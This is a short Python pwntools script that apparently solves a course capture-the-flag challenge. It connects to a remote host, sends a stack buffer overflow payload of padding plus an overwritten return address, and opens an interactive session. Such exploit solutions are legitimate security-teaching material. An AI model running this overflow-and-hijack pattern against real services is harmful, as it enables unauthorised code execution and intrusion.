from pwn import *
r = remote('edu-ctf.csie.org', 10170)
r.sendlineafter('\n', b'A'*0x38 + 0x40068b.to_bytes(8,'little'))
r.interactive()